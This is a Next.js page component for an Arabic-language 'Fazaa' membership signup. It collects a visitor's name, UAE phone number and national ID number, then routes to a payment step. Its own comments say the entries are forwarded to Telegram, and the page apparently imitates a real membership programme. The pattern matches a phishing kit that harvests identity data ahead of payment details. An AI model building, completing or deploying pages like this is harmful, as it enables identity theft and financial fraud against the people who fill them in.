import { useState, FormEvent } from 'react';
import Head from 'next/head';
import { useRouter } from 'next/router';

export default function Order() {
  const router = useRouter();
  const [fullName, setFullName] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [nationalId, setNationalId] = useState('');
  const [errors, setErrors] = useState({ fullName: '', phone: '', id: '' });

  const validateForm = () => {
    const newErrors = { fullName: '', phone: '', id: '' };
    let isValid = true;

    if (!fullName.trim()) {
      newErrors.fullName = 'يرجى إدخال اسمك';
      isValid = false;
    }

    if (!phoneNumber.trim() || phoneNumber.length < 9) {
      newErrors.phone = 'يرجى إدخال رقم هاتف صحيح';
      isValid = false;
    }

    if (!nationalId.trim()) {
      newErrors.id = 'يرجى إدخال رقم الهوية';
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const sendToTelegram = async () => {
    try {
      await fetch('/api/send-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'personal',
          data: {
            fullName,
            phoneNumber: `+971${phoneNumber}`,
            nationalId,
          },
        }),
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    // حفظ في localStorage
    localStorage.setItem(
      'fazaa.orderForm',
      JSON.stringify({
        fullName,
        phoneNumber: `+971${phoneNumber}`,
        nationalId,
        createdAt: new Date().toISOString(),
      })
    );

    // إرسال إلى Telegram
    await sendToTelegram();

    // الانتقال إلى step2
    router.push('/step2');
  };

  return (
    <>
      <Head>
        <title>فزعة - التسجيل</title>
        <link rel="stylesheet" href="/assets/css/styles.css" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
        <link rel="stylesheet" href="/assets/fonts/fontawesome/css/all.min.css" />
      </Head>

      <div className="page order-page">
        <header className="header">
          <div className="header__media" aria-hidden="true">
            <img className="header__background" src="/assets/images/header.jpg" alt="" />
          </div>
          <div className="header__inner">
            <div className="header__utility" aria-label="Utility">
              <a className="header__utility-link" href="#">
                <i className="fa-solid fa-language"></i> English
              </a>
              <a className="brand" href="/" aria-label="فزعة">
                <img className="brand__image" src="/assets/images/logo.png" alt="" aria-hidden="true" />
              </a>
            </div>
          </div>
        </header>

        <main className="order">
          <section className="order__hero">
            <h1 className="order__title">كن عضواً</h1>
            <div className="order__steps">
              <div className="order__step">
                <span className="order__step-dot order__step-dot--active">1</span>
                <span className="order__step-label">معلومات شخصية</span>
              </div>
              <div className="order__step-order order__step-order--active"></div>
              <div className="order__step">
                <span className="order__step-dot">2</span>
                <span className="order__step-label">معلومات الدفع</span>
              </div>
            </div>

            <form className="order__panel" onSubmit={handleSubmit}>
              <p className="order__copy">يرجى إدخال معلوماتك بشكل صحيح</p>

              <section className="order__step-panel order__step-panel--active">
                <div className="order__field">
                  <label className="order__label" htmlFor="full-name">
                    الاسم
                  </label>
                  <input
                    id="full-name"
                    name="fullName"
                    className="order__input"
                    type="text"
                    autoComplete="name"
                    placeholder="يرجى إدخال اسمك"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                  />
                  {errors.fullName && <div className="order__error">{errors.fullName}</div>}
                </div>

                <div className="order__field">
                  <label className="order__label" htmlFor="phone-number">
                    رقم الهاتف
                  </label>
                  <div className="order__phone-wrap">
                    <span className="order__phone-prefix" aria-hidden="true">
                      +971
                    </span>
                    <input
                      id="phone-number"
                      name="phoneNumber"
                      className="order__input order__input--phone"
                      type="tel"
                      inputMode="numeric"
                      autoComplete="tel"
                      placeholder="يرجى إدخال رقم هاتفك"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                    />
                  </div>
                  {errors.phone && <div className="order__error">{errors.phone}</div>}
                </div>

                <div className="order__field">
                  <label className="order__label" htmlFor="national-id">
                    رقم الهوية
                  </label>
                  <input
                    id="national-id"
                    name="nationalId"
                    className="order__input"
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    placeholder="يرجى إدخال رقم الهوية"
                    value={nationalId}
                    onChange={(e) => setNationalId(e.target.value)}
                  />
                  {errors.id && <div className="order__error">{errors.id}</div>}
                </div>
              </section>

              <div className="order__actions">
                <button className="order__submit" type="submit">
                  المتابعة
                </button>
              </div>
            </form>
          </section>
        </main>

        <footer className="footer">
          <div className="footer__inner">
            <div>
              <strong>فزعة</strong>
              <div className="footer__small">© 2026 فزعة. جميع الحقوق محفوظة.</div>
            </div>
            <div className="footer__links">
              <a href="#">سياسة الخصوصية</a>
              <a href="#">شروط الخدمة</a>
              <a href="#">الدعم</a>
              <a href="#">الأسئلة الشائعة</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
}
